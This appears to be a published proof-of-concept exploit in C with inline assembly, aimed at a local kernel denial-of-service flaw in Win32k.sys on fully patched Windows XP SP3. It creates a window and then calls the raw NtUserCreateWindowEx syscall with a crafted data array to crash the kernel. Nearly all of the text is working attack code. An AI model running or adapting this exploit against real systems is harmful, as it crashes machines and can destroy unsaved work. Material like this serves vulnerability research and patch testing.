////////////////////////////////////////////////////////////////////////////
//
// Title: Microsoft Windows xp Win32k.sys Local Kernel DoS Vulnerability
// Author: Lufeng Li of Neusoft Corporation
// Vendor: www.microsoft.com
// Vulnerable: Windows xp sp3(full patch)
//
/////////////////////////////////////////////////////////////////////////////

#include <Windows.h>
#include <stdio.h>

void NtUserCreateWindowEx(HANDLE d1,int d2,int d3)
{
	_asm{
		xor eax,eax
		push eax
		push eax
	    	push eax
	    	push eax
	    	push eax
	    	push eax
	    	push eax
		push eax
		push eax
	    	push eax
	    	push eax
	    	push eax
	    	push d3
	    	push d2
		push d1
		push eax
		mov eax,0x1157
		mov edx,7FFE0300h
		call  dword ptr[edx]
		ret 0x3c
	}
}
void main()
{
	UINT i=0;
	UINT c[]={  
 0x00000000,0x28001500,0xff7c98cc,0x23ffffff
,0x167c98cc,0x007c98fb,0x02001500,0x78010000
,0x00000000,0x00001500,0x00000000,0x00001500
,0x00000000,0x00001500,0x00000000,0x00000000
,0x00000000,0x00000000,0x34000000,0x3cc00000
,0x5c0007fb,0x617c92f6,0x347c92f6,0x00c00000
,0x00000000,0x18000000,0x000007fb,0xf8000000
,0x200007fd,0x347c92e9,0x02c00000,0x4c000000
	};
		HWND _wnd = CreateWindowEx(WS_EX_TOPMOST,
								"magic",
								"magic",
								WS_POPUP,
								100,
								100,
								100,
								100,
								0,
								0,
								GetModuleHandle( 0 ),
								0);
	NtUserCreateWindowEx(_wnd,0x26,(UINT)c);
}